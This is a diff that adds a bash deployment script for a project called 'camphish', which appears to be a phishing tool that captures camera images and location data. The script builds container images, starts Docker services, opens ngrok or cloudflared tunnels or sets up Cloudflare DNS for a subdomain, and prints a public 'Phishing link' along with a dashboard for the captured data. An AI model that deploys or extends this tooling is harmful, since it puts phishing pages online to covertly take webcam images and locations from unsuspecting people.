@@ -1,0 +1,212 @@
+#!/usr/bin/env bash
+set -euo pipefail
+
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
+cd "$PROJECT_DIR"
+
+source .env 2>/dev/null || true
+
+DEPLOY_MODE="${DEPLOY_MODE:-local}"
+TUNNEL="${TUNNEL:-cloudflared}"
+PROXY="${PROXY:-caddy}"
+IMAGE_NAME="${IMAGE_NAME:-camphish-app}"
+BUILDER="${BUILDER:-paketobuildpacks/builder-jammy-full}"
+DASHBOARD_PORT="${DASHBOARD_PORT:-8080}"
+DOMAIN="${DOMAIN:-}"
+SUBDOMAIN="${SUBDOMAIN:-camphish}"
+CF_API_TOKEN="${CF_API_TOKEN:-}"
+CF_ZONE_ID="${CF_ZONE_ID:-}"
+CF_ORANGE_CLOUD="${CF_ORANGE_CLOUD:-false}"
+
+check_deps() {
+    local missing=()
+    command -v docker >/dev/null 2>&1 || missing+=("docker")
+    command -v pack >/dev/null 2>&1 || missing+=("pack")
+    if [ ${#missing[@]} -gt 0 ]; then
+        echo "Missing dependencies: ${missing[*]}"
+        echo "Install pack: brew install buildpacks/tap/pack"
+        echo "Install docker: https://docs.docker.com/get-docker/"
+        exit 1
+    fi
+}
+
+build_image() {
+    echo "Building OCI image with pack..."
+    local arch=$(uname -m)
+    local build_args=(
+        --builder "$BUILDER"
+        --path "$PROJECT_DIR/app/public"
+        --default-process web
+        --trust-builder
+    )
+
+    if [ -n "${IMAGE_REGISTRY:-}" ]; then
+        build_args+=(--publish)
+        IMAGE_NAME="${IMAGE_REGISTRY}/${IMAGE_NAME}"
+    fi
+
+    pack build "$IMAGE_NAME" "${build_args[@]}"
+    echo "Image built: $IMAGE_NAME"
+}
+
+build_dashboard_image() {
+    echo "Building dashboard OCI image with pack..."
+    local build_args=(
+        --builder "$BUILDER"
+        --path "$PROJECT_DIR/app/dashboard"
+        --default-process web
+        --trust-builder
+    )
+
+    local dashboard_image="${IMAGE_NAME}-dashboard"
+    if [ -n "${IMAGE_REGISTRY:-}" ]; then
+        build_args+=(--publish)
+        dashboard_image="${IMAGE_REGISTRY}/${dashboard_image}"
+    fi
+
+    pack build "$dashboard_image" "${build_args[@]}"
+    echo "Dashboard image built: $dashboard_image"
+}
+
+start_local() {
+    echo "Starting local deployment (tunnel: $TUNNEL)..."
+    local profile=""
+    case "$TUNNEL" in
+        ngrok)     profile="--profile ngrok" ;;
+        cloudflared) profile="--profile cloudflared" ;;
+        none)      profile="" ;;
+        *)         echo "Invalid tunnel: $TUNNEL"; exit 1 ;;
+    esac
+
+    docker compose $profile up -d
+
+    echo "Waiting for services..."
+    sleep 8
+
+    if [ "$TUNNEL" != "none" ]; then
+        if [ "$TUNNEL" = "ngrok" ]; then
+            local link=$(curl -s http://localhost:4040/api/tunnels 2>/dev/null | jq -r '.tunnels[0].public_url // empty' 2>/dev/null)
+            [ -n "$link" ] && echo "Phishing link: $link" || echo "Check: curl http://localhost:4040/api/tunnels"
+        else
+            local link=$(docker compose logs cloudflared 2>/dev/null | grep -o 'https://[-0-9a-z]*\.trycloudflare.com' | tail -1)
+            [ -n "$link" ] && echo "Phishing link: $link" || echo "Check: make logs-tunnel"
+        fi
+    fi
+    echo "Dashboard: http://localhost:${DASHBOARD_PORT}"
+}
+
+start_self_hosted() {
+    echo "Starting self-hosted deployment on VPS..."
+    if [ -z "$DOMAIN" ]; then
+        echo "ERROR: DOMAIN must be set in .env for self-hosted mode"
+        exit 1
+    fi
+
+    local fqdn="${SUBDOMAIN}.${DOMAIN}"
+    echo "Target FQDN: $fqdn"
+
+    if [ -n "$CF_API_TOKEN" ] && [ -n "$CF_ZONE_ID" ]; then
+        echo "Configuring Cloudflare DNS..."
+        bash "$PROJECT_DIR/cloudflare/dns-setup.sh" \
+            "$CF_API_TOKEN" "$CF_ZONE_ID" "$fqdn" "$CF_ORANGE_CLOUD"
+    fi
+
+    local proxy_profile="--profile self-hosted --profile proxy-${PROXY}"
+    docker compose $proxy_profile up -d
+
+    echo "Self-hosted deployment ready at https://${fqdn}"
+    echo "Dashboard: https://${fqdn}:${DASHBOARD_PORT} (or via proxy)"
+}
+
+start_coolify() {
+    echo "Starting Coolify-compatible deployment..."
+    docker compose --profile coolify up -d
+    echo "Deployed for Coolify. Configure the service in Coolify dashboard."
+    echo "Set FQDN in Coolify to: ${SUBDOMAIN}.${DOMAIN}"
+}
+
+stop() {
+    docker compose --profile '*' down
+    if [ "${AUTO_CLEANUP:-false}" = "true" ]; then
+        rm -f data/logs/*.log data/locations/current_location.txt
+    fi
+}
+
+logs() {
+    docker compose logs -f --tail="${LOG_TAIL:-100}"
+}
+
+status() {
+    docker compose ps
+    echo ""
+    echo "Dashboard: http://localhost:${DASHBOARD_PORT}"
+}
+
+link() {
+    if [ "$TUNNEL" = "ngrok" ]; then
+        curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url // "not ready"'
+    elif [ "$TUNNEL" = "cloudflared" ]; then
+        docker compose logs cloudflared 2>/dev/null | grep -o 'https://[-0-9a-z]*\.trycloudflare.com' | tail -1 || echo "not ready"
+    else
+        echo "https://${SUBDOMAIN}.${DOMAIN}"
+    fi
+}
+
+clean() {
+    docker compose --profile '*' down -v
+    rm -rf data/captures/* data/locations/* data/logs/*
+}
+
+inspect() {
+    pack inspect-image "$IMAGE_NAME"
+}
+
+rebase() {
+    echo "Rebasing image on updated run image..."
+    pack rebase "$IMAGE_NAME"
+}
+
+sbom() {
+    mkdir -p sbom-out
+    pack sbom download "$IMAGE_NAME" --output-dir sbom-out
+    echo "SBOM downloaded to sbom-out/"
+}
+
+case "${1:-up}" in
+    build)
+        check_deps
+        build_image
+        ;;
+    build-all)
+        check_deps
+        build_image
+        build_dashboard_image
+        ;;
+    up)
+        case "$DEPLOY_MODE" in
+            local)       start_local ;;
+            self-hosted) start_self_hosted ;;
+            coolify)     start_coolify ;;
+            *)           echo "Invalid DEPLOY_MODE: $DEPLOY_MODE"; exit 1 ;;
+        esac
+        ;;
+    down)       stop ;;
+    restart)    stop && sleep 2 && start_local ;;
+    logs)       logs ;;
+    status)     status ;;
+    link)       link ;;
+    clean)      clean ;;
+    inspect)    check_deps && inspect ;;
+    rebase)     check_deps && rebase ;;
+    sbom)       check_deps && sbom ;;
+    *)
+        echo "Usage: $0 {build|build-all|up|down|restart|logs|status|link|clean|inspect|rebase|sbom}"
+        echo ""
+        echo "Deployment modes (set DEPLOY_MODE in .env):"
+        echo "  local       - Local Docker with tunnel (ngrok/cloudflared)"
+        echo "  self-hosted - VPS with reverse proxy + domain"
+        echo "  coolify     - Coolify-compatible deployment"
+        exit 1
+        ;;
+esac
